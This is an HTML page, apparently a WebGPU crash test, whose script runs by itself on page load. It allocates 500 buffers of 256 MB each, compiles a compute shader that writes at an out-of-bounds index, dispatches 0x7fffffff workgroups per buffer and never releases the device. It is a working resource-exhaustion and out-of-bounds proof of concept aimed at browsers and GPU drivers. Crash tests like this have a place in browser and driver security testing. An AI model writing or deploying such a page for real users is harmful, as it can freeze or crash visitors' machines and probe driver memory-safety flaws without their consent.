<!DOCTYPE html>
<html>
<head>
    <title>WebGPU Crash Test - Auto Run</title>
</head>
<body>
    <h1>WebGPU Crash Test (Auto Run)</h1>
    <canvas id="canvas" width="1024" height="1024"></canvas>
    <script>
        (async function() {
            if (!navigator.gpu) {
                console.log("WebGPU not available");
                return;
            }
            try {
                const adapter = await navigator.gpu.requestAdapter();
                const device = await adapter.requestDevice();

                const buffers = [];
                for (let i = 0; i < 500; i++) {
                    buffers.push(device.createBuffer({
                        size: 256 * 1024 * 1024,
                        usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST
                    }));
                }

                const shaderModule = device.createShaderModule({
                    code: `
                        @group(0) @binding(0) var<storage, read_write> data : array<u32>;
                        @compute @workgroup_size(1)
                        fn main(@builtin(global_invocation_id) id : vec3<u32>) {
                            data[0x7fffffff] = 0xdeadbeef;
                        }
                    `
                });

                const pipeline = device.createComputePipeline({
                    layout: 'auto',
                    compute: { module: shaderModule, entryPoint: 'main' }
                });

                for (let i = 0; i < buffers.length; i++) {
                    const bindGroup = device.createBindGroup({
                        layout: pipeline.getBindGroupLayout(0),
                        entries: [{ binding: 0, resource: { buffer: buffers[i] } }]
                    });
                    const encoder = device.createCommandEncoder();
                    const pass = encoder.beginComputePass();
                    pass.setPipeline(pipeline);
                    pass.setBindGroup(0, bindGroup);
                    pass.dispatchWorkgroups(0x7fffffff);
                    pass.end();
                    device.queue.submit([encoder.finish()]);
                }

                // No device.destroy()
            } catch (e) { console.log(e); }
        })();
    </script>
</body>
</html>
